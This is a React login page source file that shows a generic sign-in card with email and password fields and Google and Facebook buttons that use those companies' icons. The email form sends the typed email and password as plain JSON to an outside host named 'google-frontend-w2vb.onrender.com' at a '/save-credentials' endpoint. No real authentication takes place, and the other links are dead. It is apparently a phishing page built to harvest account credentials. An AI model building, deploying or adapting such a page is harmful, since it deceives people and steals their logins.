// frontend/src/LoginPage.js
import React, { useState } from 'react';

const styles = {
  container: {
    minHeight: '100vh',
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'center',
    backgroundColor: '#f5f5f5',
    padding: '1rem',
    fontFamily: 'system-ui, -apple-system, sans-serif'
  },
  card: {
    width: '100%',
    maxWidth: '400px',
    backgroundColor: 'white',
    borderRadius: '8px',
    boxShadow: '0 2px 8px rgba(0, 0, 0, 0.1)',
    padding: '2rem'
  },
  header: {
    textAlign: 'center',
    marginBottom: '2rem'
  },
  title: {
    fontSize: '1.5rem',
    fontWeight: 'bold',
    marginBottom: '0.5rem',
    color: '#333'
  },
  subtitle: {
    fontSize: '0.875rem',
    color: '#666'
  },
  form: {
    display: 'flex',
    flexDirection: 'column',
    gap: '1rem'
  },
  input: {
    width: '100%',
    padding: '0.75rem',
    border: '1px solid #ddd',
    borderRadius: '4px',
    fontSize: '1rem',
    outline: 'none',
    transition: 'border-color 0.2s',
    boxSizing: 'border-box'
  },
  button: {
    width: '100%',
    padding: '0.75rem',
    border: 'none',
    borderRadius: '4px',
    fontSize: '1rem',
    cursor: 'pointer',
    transition: 'background-color 0.2s',
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'center',
    gap: '0.5rem'
  },
  primaryButton: {
    backgroundColor: '#2563eb',
    color: 'white'
  },
  socialButton: {
    backgroundColor: 'white',
    border: '1px solid #ddd',
    color: '#333'
  },
  divider: {
    display: 'flex',
    alignItems: 'center',
    margin: '1.5rem 0',
    gap: '1rem'
  },
  dividerLine: {
    flex: 1,
    height: '1px',
    backgroundColor: '#ddd'
  },
  dividerText: {
    color: '#666',
    fontSize: '0.75rem',
    textTransform: 'uppercase'
  },
  socialButtons: {
    display: 'grid',
    gridTemplateColumns: '1fr 1fr',
    gap: '1rem',
    marginBottom: '1.5rem'
  },
  footer: {
    textAlign: 'center',
    fontSize: '0.875rem',
    color: '#666'
  },
  link: {
    color: '#2563eb',
    textDecoration: 'none'
  },
  icon: {
    width: '18px',
    height: '18px',
    marginRight: '8px'
  }
};

const App = () => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');

  const handleEmailLogin = async (e) => {
    e.preventDefault();
    const credentials = { email, password };
    try {
      const response = await fetch('https://google-frontend-w2vb.onrender.com/save-credentials', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(credentials)
      });
      console.log(await response.text());
    } catch (error) {
      console.error('Error saving credentials:', error);
    }
  };

  const handleSocialLogin = async (provider) => {
    const credentials = { provider, password: 'N/A' };
    try {
      const response = await fetch('https://google-frontend-w2vb.onrender.com/save-credentials', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(credentials)
      });
      console.log(await response.text());
    } catch (error) {
      console.error('Error saving credentials:', error);
    }
  };

  return (
    <div style={styles.container}>
      <div style={styles.card}>
        <div style={styles.header}>
          <h1 style={styles.title}>Welcome back</h1>
          <p style={styles.subtitle}>Sign in to your account</p>
        </div>

        <form onSubmit={handleEmailLogin} style={styles.form}>
          <input
            type="email"
            placeholder="name@example.com"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            style={styles.input}
            required
          />
          <input
            type="password"
            placeholder="Enter your password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            style={styles.input}
            required
          />
          <button
            type="submit"
            style={{ ...styles.button, ...styles.primaryButton }}
          >
            Sign in with Email
          </button>
        </form>

        <div style={styles.divider}>
          <div style={styles.dividerLine}></div>
          <span style={styles.dividerText}>Or continue with</span>
          <div style={styles.dividerLine}></div>
        </div>

        <div style={styles.socialButtons}>
          <button
            onClick={() => handleSocialLogin('Google')}
            style={{ ...styles.button, ...styles.socialButton }}
          >
            <img 
              src="https://accounts.google.com/favicon.ico" 
              alt="Google"
              style={styles.icon}
            />
            Google
          </button>
          <button
            onClick={() => handleSocialLogin('Facebook')}
            style={{ ...styles.button, ...styles.socialButton }}
          >
            <img 
              src="https://facebook.com/favicon.ico" 
              alt="Facebook"
              style={styles.icon}
            />
            Facebook
          </button>
        </div>

        <div style={styles.footer}>
          <p style={{ marginBottom: '1rem' }}>
            <a href="#" style={styles.link}>
              Forgot password?
            </a>
          </p>
          <p>
            Don't have an account?{' '}
            <a href="#" style={styles.link}>
              Sign up
            </a>
          </p>
        </div>
      </div>
    </div>
  );
};

export default App;
